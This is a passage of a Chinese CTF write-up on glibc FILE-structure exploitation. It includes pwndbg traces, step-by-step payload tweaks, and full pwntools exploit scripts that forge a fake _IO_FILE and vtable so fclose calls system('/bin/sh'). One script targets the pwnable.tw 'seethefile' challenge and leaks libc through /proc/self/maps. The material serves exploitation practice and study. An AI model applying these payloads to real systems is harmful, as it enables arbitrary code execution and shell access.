    _flags2 <span class="o">=</span> 0,
    _old_offset <span class="o">=</span> <span class="nt">-1</span>,
    _cur_column <span class="o">=</span> 0,
    _vtable_offset <span class="o">=</span> 0 <span class="s1">'\000'</span>,
    _shortbuf <span class="o">=</span> <span class="s2">""</span>,
    _lock <span class="o">=</span> 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;,
    _offset <span class="o">=</span> <span class="nt">-1</span>,
    _codecvt <span class="o">=</span> 0x0,
    _wide_data <span class="o">=</span> 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;,
    _freeres_list <span class="o">=</span> 0x0,
    _freeres_buf <span class="o">=</span> 0x0,
    __pad5 <span class="o">=</span> 0,
    _mode <span class="o">=</span> <span class="nt">-1</span>,
    _unused2 <span class="o">=</span> <span class="s1">'\000'</span> &lt;repeats 19 <span class="nb">times</span><span class="o">&gt;</span>
  <span class="o">}</span>,
  vtable <span class="o">=</span> 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
<span class="o">}</span>
pwndbg&gt; p &amp;<span class="o">(</span><span class="k">*</span><span class="o">(</span>struct _IO_FILE_plus <span class="k">*</span><span class="o">)</span> 0x7ffff7dd18e0<span class="o">)</span>-&gt;file-&gt;_lock
<span class="nv">$10</span> <span class="o">=</span> <span class="o">(</span>_IO_lock_t <span class="k">**</span><span class="o">)</span> 0x7ffff7dd1968 &lt;_IO_2_1_stdin_+136&gt;
pwndbg&gt; p/x 0x7ffff7dd1968-0x7ffff7dd18e0
<span class="nv">$11</span> <span class="o">=</span> 0x88
pwndbg&gt; p &amp;<span class="o">(</span><span class="k">*</span><span class="o">(</span>struct _IO_FILE<span class="k">*</span><span class="o">)</span>0<span class="o">)</span>-&gt;_chain
<span class="nv">$5</span> <span class="o">=</span> <span class="o">(</span>struct _IO_FILE <span class="k">**</span><span class="o">)</span> 0x68
pwndbg&gt;
</pre></table></code></div></div><p>计算buf_addr开始，_lock的地址，然后两值一减就是offset了： <code class="language-plaintext highlighter-rouge">p &amp;(*(struct _IO_FILE_plus *) buf_addr)-&gt;file-&gt;_lock</code></p><p>当然每次打一长串还是挺麻烦的，如果有安装pwngdb插件的话，fp命令还是挺方便的</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>pwndbg&gt; fp 0x601060
<span class="nv">$13</span> <span class="o">=</span> <span class="o">{</span>
  file <span class="o">=</span> <span class="o">{</span>
    _flags <span class="o">=</span> 1633771873,
    _IO_read_ptr <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_read_end <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_read_base <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_write_base <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_write_ptr <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_write_end <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_buf_base <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_buf_end <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_save_base <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_backup_base <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _IO_save_end <span class="o">=</span> 0x6161616161616161 &lt;error: Cannot access memory at address 0x6161616161616161&gt;,
    _markers <span class="o">=</span> 0x6161616161616161,
    _chain <span class="o">=</span> 0x6161616161616161,
    _fileno <span class="o">=</span> 1633771873,
    _flags2 <span class="o">=</span> 1633771873,
    _old_offset <span class="o">=</span> 7016996765293437281,
    _cur_column <span class="o">=</span> 24929,
    _vtable_offset <span class="o">=</span> 97 <span class="s1">'a'</span>,
    _shortbuf <span class="o">=</span> <span class="s2">"a"</span>,
    _lock <span class="o">=</span> 0x6161616161616161,
    _offset <span class="o">=</span> 7016996765293437281,
    _codecvt <span class="o">=</span> 0x6161616161616161,
    _wide_data <span class="o">=</span> 0x6161616161616161,
    _freeres_list <span class="o">=</span> 0x6161616161616161,
    _freeres_buf <span class="o">=</span> 0x6161616161616161,
    __pad5 <span class="o">=</span> 7016996765293437281,
    _mode <span class="o">=</span> 1633771873,
    _unused2 <span class="o">=</span> <span class="s1">'a'</span> &lt;repeats 20 <span class="nb">times</span><span class="o">&gt;</span>
  <span class="o">}</span>,
  vtable <span class="o">=</span> 0x6161616161616161
<span class="o">}</span>
pwndbg&gt; p &amp;<span class="nv">$13</span>-&gt;file-&gt;_lock
<span class="nv">$14</span> <span class="o">=</span> <span class="o">(</span>_IO_lock_t <span class="k">**</span><span class="o">)</span> 0x6010e8 &lt;buf+136&gt;
pwndbg&gt; p/x 136
<span class="nv">$15</span> <span class="o">=</span> 0x88
</pre></table></code></div></div><p>于是修改poc：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</pre></table></code></div></div><p>运行结果：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>─────────────────────────────────────[ REGISTERS <span class="o">]</span>──────────────────────────────────────
<span class="k">*</span>RAX  0x0
<span class="k">*</span>RBX  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— <span class="s1">'a`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>
<span class="k">*</span>RCX  0x7ffff7dd18e0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> ◂— 0xfbad2088
<span class="k">*</span>RDX  0x6161616161616161 <span class="o">(</span><span class="s1">'aaaaaaaa'</span><span class="o">)</span>
<span class="k">*</span>RDI  0x6161616161616161 <span class="o">(</span><span class="s1">'aaaaaaaa'</span><span class="o">)</span>
<span class="k">*</span>RSI  0x1
<span class="k">*</span>RBP  0x0
<span class="k">*</span>RSP  0x7fffffffdff0 ◂— 0x0
<span class="k">*</span>RIP  0x7ffff7a91562 <span class="o">(</span>free+34<span class="o">)</span> ◂— mov    rax, qword ptr <span class="o">[</span>rdi - 8]
───────────────────────────────────────[ DISASM <span class="o">]</span>───────────────────────────────────────
 ► 0x7ffff7a91562 &lt;free+34&gt;     mov    rax, qword ptr <span class="o">[</span>rdi - 8]
   0x7ffff7a91566 &lt;free+38&gt;     lea    rsi, <span class="o">[</span>rdi - 0x10]
   0x7ffff7a9156a &lt;free+42&gt;     <span class="nb">test   </span>al, 2
   0x7ffff7a9156c &lt;free+44&gt;     jne    free+96                &lt;free+96&gt;
    ↓
   0x7ffff7a915a0 &lt;free+96&gt;     mov    edx, dword ptr <span class="o">[</span>rip + 0x33fbee] &lt;mp_+52&gt;
</pre></table></code></div></div><p>发现并没有<strong>call [rax+0x10]</strong>，会进入free</p><h3 id="如何call-rax0x10">如何call [rax+0x10]?<a href="#如何call-rax0x10" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>实际运行流程图：</p><p><img data-src="/assets/img/2022/file_structure.drawio.svg" alt="file_structure.drawio" data-proofer-ignore></p><p>主要还是file structure中一些值的影响，改变了程序逻辑，使得没有做到预期的分支。</p><p>那么如何获得<code class="language-plaintext highlighter-rouge">call [rax+0x10]</code>呢，见上图所示</p><p>答案是原先payload中开头padding部分 <code class="language-plaintext highlighter-rouge">"a"*0x88</code> 改成 <code class="language-plaintext highlighter-rouge">"a".ljust(0x88, "\x00")</code></p><p>poc改为：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</pre></table></code></div></div><p>运行结果：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>    ─────────────────────────────────────[ REGISTERS <span class="o">]</span>──────────────────────────────────────
    <span class="k">*</span>RAX  0x2020202020202020 <span class="o">(</span><span class="s1">'        '</span><span class="o">)</span>
    <span class="k">*</span>RBX  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x61 /<span class="k">*</span> <span class="s1">'a'</span> <span class="k">*</span>/
    <span class="k">*</span>RCX  0x7ffff7dd18e0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> ◂— 0xfbad2088
    <span class="k">*</span>RDX  0x601560 ◂— 0x0
    <span class="k">*</span>RDI  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x61 /<span class="k">*</span> <span class="s1">'a'</span> <span class="k">*</span>/
    <span class="k">*</span>RSI  0x0

    <span class="k">*</span>RBP  0xffffffff
    <span class="k">*</span>RSP  0x7fffffffe070 ◂— 0x0
    <span class="k">*</span>RIP  0x7ffff7a7a2ac <span class="o">(</span>fclose+60<span class="o">)</span> ◂— call   qword ptr <span class="o">[</span>rax + 0x10]
    ───────────────────────────────────────[ DISASM <span class="o">]</span>───────────────────────────────────────
     ► 0x7ffff7a7a2ac &lt;fclose+60&gt;     call   qword ptr <span class="o">[</span>rax + 0x10]

       0x7ffff7a7a2af &lt;fclose+63&gt;     mov    eax, dword ptr <span class="o">[</span>rbx + 0xc0]
       0x7ffff7a7a2b5 &lt;fclose+69&gt;     <span class="nb">test   </span>eax, eax
       0x7ffff7a7a2b7 &lt;fclose+71&gt;     jle    fclose+496                &lt;fclose+496&gt;
</pre></table></code></div></div><p>成功控制了RIP</p><p>分析为什么可以获得<code class="language-plaintext highlighter-rouge">call [rax+0x10]</code>，<code class="language-plaintext highlighter-rouge">_IO_new_fclose</code>源码如下：</p><p><img data-src="/assets/img/2022/image-20220922221007513.png" alt="image-20220922221007513" data-proofer-ignore></p><p>所以关键是<code class="language-plaintext highlighter-rouge">_flags</code>这个值，会影响进不进<code class="language-plaintext highlighter-rouge">_IO_file_close_it</code></p><p>还是见上图，第二种情况，payload是<code class="language-plaintext highlighter-rouge">'/bin/sh'.ljust(0x88, '\x00')</code>时，会获得一次<code class="language-plaintext highlighter-rouge">call [rax+0x88]</code>，这个是<code class="language-plaintext highlighter-rouge">vtable-&gt;_close</code></p><p>poc：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">p</span> <span class="o">=</span> <span class="s">'/bin/sh'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</pre></table></code></div></div><p>运行结果：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>─────────────────────────────────────[ REGISTERS <span class="o">]</span>──────────────────────────────────────
<span class="k">*</span>RAX  0x2020202020202020 <span class="o">(</span><span class="s1">'        '</span><span class="o">)</span>
<span class="k">*</span>RBX  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x68732f6e69622f /<span class="k">*</span> <span class="s1">'/bin/sh'</span> <span class="k">*</span>/
<span class="k">*</span>RCX  0x7ffff7dd18e0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> ◂— 0xfbad2088
<span class="k">*</span>RDX  0x0
<span class="k">*</span>RDI  0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x68732f6e69622f /<span class="k">*</span> <span class="s1">'/bin/sh'</span> <span class="k">*</span>/
<span class="k">*</span>RSI  0x1

<span class="k">*</span>RBP  0x0
<span class="k">*</span>RSP  0x7fffffffe050 —▸ 0x601060 <span class="o">(</span>buf<span class="o">)</span> ◂— 0x68732f6e69622f /<span class="k">*</span> <span class="s1">'/bin/sh'</span> <span class="k">*</span>/
<span class="k">*</span>RIP  0x7ffff7a8696a <span class="o">(</span>_IO_file_close_it+282<span class="o">)</span> ◂— call   qword ptr <span class="o">[</span>rax + 0x88]
───────────────────────────────────────[ DISASM <span class="o">]</span>───────────────────────────────────────
 ► 0x7ffff7a8696a &lt;_IO_file_close_it+282&gt;    call   qword ptr <span class="o">[</span>rax + 0x88]

   0x7ffff7a86970 &lt;_IO_file_close_it+288&gt;    mov    ebp, eax
   0x7ffff7a86972 &lt;_IO_file_close_it+290&gt;    jmp    _IO_file_close_it+60                &lt;_IO_file_close_it+60&gt;

   0x7ffff7a86977 &lt;_IO_file_close_it+295&gt;    nop    word ptr <span class="o">[</span>rax + rax]
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">_IO_new_file_close_it</code>源码中的调用点如下：</p><p><img data-src="/assets/img/2022/image-20220922223525729.png" alt="image-20220922223525729" data-proofer-ignore></p><p><img data-src="/assets/img/2022/image-20220922223611848.png" alt="image-20220922223611848" data-proofer-ignore></p><p>我觉得输入/bin/sh开头的payload比较好利用</p><p>思路：</p><p>首先如上获得<code class="language-plaintext highlighter-rouge">call [rax+0x88]</code>，这个<code class="language-plaintext highlighter-rouge">rax</code>的地址是相对于buf偏移为<code class="language-plaintext highlighter-rouge">0xd8</code>的vtable。所以需要把vtable指到可以恶意构造的一块地方，称之为fake vtable。</p><p>然后再vtable+0x88的地址上写入system，由于此时rdi已经是/bin/sh了，所以直接可以拿到shell</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./baby_file"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="c1"># debug()
</span><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x601060</span>
<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x110</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7a523a0</span> <span class="c1"># PIE &amp; ASLR off, only for debug 
</span><span class="n">p</span> <span class="o">=</span> <span class="s">'/bin/sh'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># bypass _lock
</span><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span> <span class="c1"># fake vtable
</span><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># overflow fp
</span><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x110</span><span class="o">+</span><span class="mh">0x88</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="c1"># vtable-&gt;_close = system
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="0x02-pwnabletw上的seethefile">0x02 pwnable.tw上的seethefile<a href="#0x02-pwnabletw上的seethefile" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>file structure的构造基本和上面的入门题一模一样。程序有一个任意文件读取的功能，通过读取<code class="language-plaintext highlighter-rouge">proc/self/maps</code>获得libc地址</p><p>exp:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># r = process('./seethefile')
# libc = ELF('/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')
</span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10200</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so'</span><span class="p">)</span>

<span class="c1">#context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">my_open</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What do you want to see :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">my_read</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">my_write</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">my_close</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">my_exit</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'5'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Leave your name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="n">my_open</span><span class="p">(</span><span class="s">'/proc/self/maps'</span><span class="p">)</span>
<span class="n">my_read</span><span class="p">()</span>
<span class="n">my_write</span><span class="p">()</span>

<span class="n">my_read</span><span class="p">()</span>
<span class="n">my_write</span><span class="p">()</span>
<span class="n">con</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'libc'</span><span class="p">)</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">con</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">system_off</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc_addr: 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'system_addr: 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>


<span class="c1"># debug()
</span><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x804b260</span> <span class="c1"># size=0x20
</span><span class="n">fake_file_structure</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x200</span>
<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x300</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to fake_file_structure
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin/sh'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span> <span class="c1"># bypass _lock
</span><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="o">+</span><span class="mh">0x94</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span> <span class="c1"># fake vtable
</span><span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x300</span><span class="o">+</span><span class="mh">0x44</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to fake vtable + 0x44
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="c1"># vtable-&gt;_close
</span>
<span class="n">my_exit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="c1">#r.sendline('cd /home/seethefile')  # 这几行IO不是很稳定
#r.sendline('./get_flag')
#r.sendline('Give me the flag')
</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
